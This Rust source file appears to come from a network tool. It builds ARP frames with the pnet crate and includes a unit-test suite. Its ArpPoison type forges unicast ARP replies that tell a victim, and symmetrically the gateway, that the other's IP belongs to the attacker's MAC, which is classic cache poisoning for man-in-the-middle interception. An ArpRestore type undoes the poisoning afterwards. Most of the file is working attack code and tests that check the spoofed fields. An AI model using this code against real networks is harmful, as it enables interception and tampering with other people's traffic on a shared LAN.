// src/network/packet.rs
use pnet::packet::Packet;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::util::MacAddr;
use std::net::Ipv4Addr;

// ─────────────────────────────────────────────────────────────────────────────
// Shared builder — everything goes through here
// ─────────────────────────────────────────────────────────────────────────────

fn build_arp_frame(
    eth_dst: MacAddr,
    eth_src: MacAddr,
    op: pnet::packet::arp::ArpOperation,
    sender_mac: MacAddr,
    sender_ip: Ipv4Addr,
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
) -> [u8; 42] {
    let mut buffer = [0u8; 42];

    let mut eth = MutableEthernetPacket::new(&mut buffer[..14])
        .expect("14 bytes is always a valid ethernet header");
    eth.set_destination(eth_dst);
    eth.set_source(eth_src);
    eth.set_ethertype(EtherTypes::Arp);

    let mut arp =
        MutableArpPacket::new(&mut buffer[14..]).expect("28 bytes is always a valid ARP packet");
    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(op);
    arp.set_sender_hw_addr(sender_mac);
    arp.set_sender_proto_addr(sender_ip);
    arp.set_target_hw_addr(target_mac);
    arp.set_target_proto_addr(target_ip);

    buffer
}

// ─────────────────────────────────────────────────────────────────────────────
// Public packet types
// ─────────────────────────────────────────────────────────────────────────────

/// Broadcast ARP request: "who has `target_ip`? tell `sender_ip`"
pub struct ArpRequest {
    pub target_ip: Ipv4Addr,
    pub sender_ip: Ipv4Addr,
    pub sender_mac: MacAddr,
}

impl ArpRequest {
    pub fn new(target_ip: Ipv4Addr, sender_ip: Ipv4Addr, sender_mac: MacAddr) -> Self {
        Self {
            target_ip,
            sender_ip,
            sender_mac,
        }
    }

    pub fn to_bytes(&self) -> [u8; 42] {
        build_arp_frame(
            MacAddr::broadcast(),
            self.sender_mac,
            ArpOperations::Request,
            self.sender_mac,
            self.sender_ip,
            MacAddr::zero(),
            self.target_ip,
        )
    }
}

/// Unicast ARP reply used to poison a target's cache.
/// Claims that `spoofed_ip` lives at `our_mac`.
pub struct ArpPoison {
    pub target_mac: MacAddr,
    pub target_ip: Ipv4Addr,
    pub spoofed_ip: Ipv4Addr,
    pub our_mac: MacAddr,
}

impl ArpPoison {
    pub fn new(
        target_mac: MacAddr,
        target_ip: Ipv4Addr,
        spoofed_ip: Ipv4Addr,
        our_mac: MacAddr,
    ) -> Self {
        Self {
            target_mac,
            target_ip,
            spoofed_ip,
            our_mac,
        }
    }

    pub fn to_bytes(&self) -> [u8; 42] {
        build_arp_frame(
            self.target_mac, // ethernet dst  → deliver to victim
            self.our_mac,    // ethernet src  → from us
            ArpOperations::Reply,
            self.our_mac,    // ARP sender MAC → our MAC
            self.spoofed_ip, // ARP sender IP  → IP we're claiming
            self.target_mac, // ARP target MAC → victim
            self.target_ip,  // ARP target IP  → victim
        )
    }
}

/// Unicast ARP reply that restores the correct mapping after poisoning stops.
/// Claims that `real_ip` lives at `real_mac` (the truth).
pub struct ArpRestore {
    pub target_mac: MacAddr,
    pub target_ip: Ipv4Addr,
    pub real_ip: Ipv4Addr,
    pub real_mac: MacAddr,
}

impl ArpRestore {
    pub fn new(
        target_mac: MacAddr,
        target_ip: Ipv4Addr,
        real_ip: Ipv4Addr,
        real_mac: MacAddr,
    ) -> Self {
        Self {
            target_mac,
            target_ip,
            real_ip,
            real_mac,
        }
    }

    pub fn to_bytes(&self) -> [u8; 42] {
        build_arp_frame(
            self.target_mac,
            self.real_mac, // ethernet src  → from the real owner
            ArpOperations::Reply,
            self.real_mac, // ARP sender MAC → the truth
            self.real_ip,  // ARP sender IP  → the truth
            self.target_mac,
            self.target_ip,
        )
    }
}

/// Parsed inbound ARP reply (used by the scanner receiver).
pub struct ArpReply {
    pub sender_mac: MacAddr,
    pub sender_ip: Ipv4Addr,
    pub target_mac: MacAddr,
    pub target_ip: Ipv4Addr,
}

impl ArpReply {
    pub fn from_bytes(data: &[u8]) -> Option<Self> {
        if data.len() < 42 {
            return None;
        }
        let eth = EthernetPacket::new(data)?;
        if eth.get_ethertype() != EtherTypes::Arp {
            return None;
        }
        let arp = ArpPacket::new(eth.payload())?;
        if arp.get_operation() != ArpOperations::Reply {
            return None;
        }
        Some(Self {
            sender_mac: arp.get_sender_hw_addr(),
            sender_ip: arp.get_sender_proto_addr(),
            target_mac: arp.get_target_hw_addr(),
            target_ip: arp.get_target_proto_addr(),
        })
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests for src/network/packet.rs
//
// Paste this #[cfg(test)] block at the bottom of src/network/packet.rs
//
// All tests are pure — no sockets, no root, no hardware required.
// Every test exercises a round-trip:  build packet → inspect raw bytes via pnet
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use pnet::packet::Packet;
    use pnet::packet::arp::{ArpOperations, ArpPacket};
    use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
    use pnet::util::MacAddr;
    use std::net::Ipv4Addr;

    // ── Fixtures ──────────────────────────────────────────────────────────────

    const LOCAL_MAC: MacAddr = MacAddr(0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF);
    const VICTIM_MAC: MacAddr = MacAddr(0x11, 0x22, 0x33, 0x44, 0x55, 0x66);
    const GATEWAY_MAC: MacAddr = MacAddr(0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01);

    const LOCAL_IP: Ipv4Addr = Ipv4Addr::new(192, 168, 1, 100);
    const VICTIM_IP: Ipv4Addr = Ipv4Addr::new(192, 168, 1, 10);
    const GATEWAY_IP: Ipv4Addr = Ipv4Addr::new(192, 168, 1, 1);

    // ── Frame-size contract ───────────────────────────────────────────────────

    /// Every ARP builder must produce exactly 42 bytes:
    ///   14 (Ethernet header) + 28 (ARP payload)
    #[test]
    fn test_arp_request_frame_is_42_bytes() {
        let bytes = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        assert_eq!(bytes.len(), 42);
    }

    #[test]
    fn test_arp_poison_frame_is_42_bytes() {
        let bytes = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        assert_eq!(bytes.len(), 42);
    }

    #[test]
    fn test_arp_restore_frame_is_42_bytes() {
        let bytes = ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();
        assert_eq!(bytes.len(), 42);
    }

    // ── ArpRequest ────────────────────────────────────────────────────────────

    /// Broadcast ARP request: Ethernet dst must be ff:ff:ff:ff:ff:ff.
    #[test]
    fn test_arp_request_ethernet_dst_is_broadcast() {
        let frame = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        assert_eq!(eth.get_destination(), MacAddr::broadcast());
    }

    /// Ethernet src must be the sender's MAC.
    #[test]
    fn test_arp_request_ethernet_src_is_local_mac() {
        let frame = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        assert_eq!(eth.get_source(), LOCAL_MAC);
    }

    /// EtherType must be 0x0806 (ARP).
    #[test]
    fn test_arp_request_ethertype_is_arp() {
        let frame = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        assert_eq!(eth.get_ethertype(), EtherTypes::Arp);
    }

    /// ARP operation must be Request (1).
    #[test]
    fn test_arp_request_operation_is_request() {
        let frame = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        assert_eq!(arp.get_operation(), ArpOperations::Request);
    }

    /// ARP sender fields reflect who is asking.
    #[test]
    fn test_arp_request_sender_fields() {
        let frame = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        assert_eq!(arp.get_sender_hw_addr(), LOCAL_MAC);
        assert_eq!(arp.get_sender_proto_addr(), LOCAL_IP);
    }

    /// ARP target IP is the host we are looking for; target MAC is all-zeros.
    #[test]
    fn test_arp_request_target_fields() {
        let frame = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        assert_eq!(arp.get_target_proto_addr(), VICTIM_IP);
        assert_eq!(arp.get_target_hw_addr(), MacAddr::zero());
    }

    // ── ArpPoison ─────────────────────────────────────────────────────────────

    /// Poison delivers to the victim — Ethernet dst must be victim MAC.
    #[test]
    fn test_arp_poison_ethernet_dst_is_victim_mac() {
        let frame = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        assert_eq!(eth.get_destination(), VICTIM_MAC);
    }

    /// Poison appears to come from us — Ethernet src must be our MAC.
    #[test]
    fn test_arp_poison_ethernet_src_is_our_mac() {
        let frame = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        assert_eq!(eth.get_source(), LOCAL_MAC);
    }

    /// Poison is a Reply (2), not a Request.
    #[test]
    fn test_arp_poison_operation_is_reply() {
        let frame = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        assert_eq!(arp.get_operation(), ArpOperations::Reply);
    }

    /// The lie: "gateway IP lives at our MAC" — sender fields carry the spoof.
    #[test]
    fn test_arp_poison_sender_fields_carry_the_lie() {
        let frame = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        // Victim will update its cache: GATEWAY_IP → LOCAL_MAC  (the lie)
        assert_eq!(arp.get_sender_hw_addr(), LOCAL_MAC);
        assert_eq!(arp.get_sender_proto_addr(), GATEWAY_IP);
    }

    /// The target fields point at the victim so they accept the reply.
    #[test]
    fn test_arp_poison_target_fields_address_victim() {
        let frame = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        assert_eq!(arp.get_target_hw_addr(), VICTIM_MAC);
        assert_eq!(arp.get_target_proto_addr(), VICTIM_IP);
    }

    /// Poisoning the gateway is symmetric: sender fields point at victim IP.
    #[test]
    fn test_arp_poison_gateway_direction_sender_fields() {
        // "victim IP lives at our MAC" — sent to the gateway
        let frame = ArpPoison::new(GATEWAY_MAC, GATEWAY_IP, VICTIM_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        assert_eq!(arp.get_sender_hw_addr(), LOCAL_MAC);
        assert_eq!(arp.get_sender_proto_addr(), VICTIM_IP);
        assert_eq!(arp.get_target_hw_addr(), GATEWAY_MAC);
        assert_eq!(arp.get_target_proto_addr(), GATEWAY_IP);
    }

    // ── ArpRestore ────────────────────────────────────────────────────────────

    /// Restore is also a Reply.
    #[test]
    fn test_arp_restore_operation_is_reply() {
        let frame = ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        assert_eq!(arp.get_operation(), ArpOperations::Reply);
    }

    /// Restore sender fields carry the truth: real IP at real MAC.
    #[test]
    fn test_arp_restore_sender_fields_carry_the_truth() {
        let frame = ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = ArpPacket::new(eth.payload()).unwrap();
        // Victim will update: GATEWAY_IP → GATEWAY_MAC  (the truth)
        assert_eq!(arp.get_sender_hw_addr(), GATEWAY_MAC);
        assert_eq!(arp.get_sender_proto_addr(), GATEWAY_IP);
    }

    /// Restore Ethernet src is the real owner's MAC, not ours.
    #[test]
    fn test_arp_restore_ethernet_src_is_real_owner_mac() {
        let frame = ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        assert_eq!(eth.get_source(), GATEWAY_MAC);
    }

    /// Restore Ethernet dst delivers to the victim.
    #[test]
    fn test_arp_restore_ethernet_dst_is_victim() {
        let frame = ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        assert_eq!(eth.get_destination(), VICTIM_MAC);
    }

    // ── ArpReply (parser) ─────────────────────────────────────────────────────

    /// A well-formed ARP reply built by ArpPoison can be parsed back by ArpReply.
    /// This is the critical round-trip: the scanner must be able to read its own
    /// spoofed frames without choking (and in practice reads frames from victims).
    #[test]
    fn test_arp_reply_parses_poison_frame() {
        let frame = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let reply = ArpReply::from_bytes(&frame);
        assert!(
            reply.is_some(),
            "ArpReply should parse a valid ARP Reply frame"
        );

        let r = reply.unwrap();
        // Sender fields in the ARP payload are what matters to the cache.
        assert_eq!(r.sender_mac, LOCAL_MAC);
        assert_eq!(r.sender_ip, GATEWAY_IP);
        assert_eq!(r.target_mac, VICTIM_MAC);
        assert_eq!(r.target_ip, VICTIM_IP);
    }

    /// A restore frame is also a Reply — ArpReply must parse it.
    #[test]
    fn test_arp_reply_parses_restore_frame() {
        let frame = ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();
        let reply = ArpReply::from_bytes(&frame);
        assert!(reply.is_some());

        let r = reply.unwrap();
        assert_eq!(r.sender_mac, GATEWAY_MAC);
        assert_eq!(r.sender_ip, GATEWAY_IP);
    }

    /// An ARP Request frame must NOT be parsed as a Reply.
    #[test]
    fn test_arp_reply_rejects_request_frame() {
        let frame = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        let reply = ArpReply::from_bytes(&frame);
        assert!(
            reply.is_none(),
            "ArpReply::from_bytes must return None for a Request frame"
        );
    }

    /// A buffer shorter than 42 bytes must not cause a panic.
    #[test]
    fn test_arp_reply_rejects_short_buffer() {
        let short = [0u8; 20];
        assert!(ArpReply::from_bytes(&short).is_none());
    }

    /// An all-zero buffer (not ARP ethertype) must be rejected gracefully.
    #[test]
    fn test_arp_reply_rejects_non_arp_ethertype() {
        let not_arp = [0u8; 42]; // ethertype bytes 12-13 are 0x0000 = not ARP
        assert!(ArpReply::from_bytes(&not_arp).is_none());
    }

    /// An empty slice must not panic.
    #[test]
    fn test_arp_reply_rejects_empty_slice() {
        assert!(ArpReply::from_bytes(&[]).is_none());
    }

    // ── Poison ↔ Restore are not the same ────────────────────────────────────

    /// The bytes produced by ArpPoison and ArpRestore for the same addresses
    /// must differ — they carry opposite sender MACs.
    #[test]
    fn test_poison_and_restore_produce_different_bytes() {
        let poison = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let restore = ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();
        assert_ne!(
            poison, restore,
            "Poison and Restore frames must not be identical"
        );
    }
}
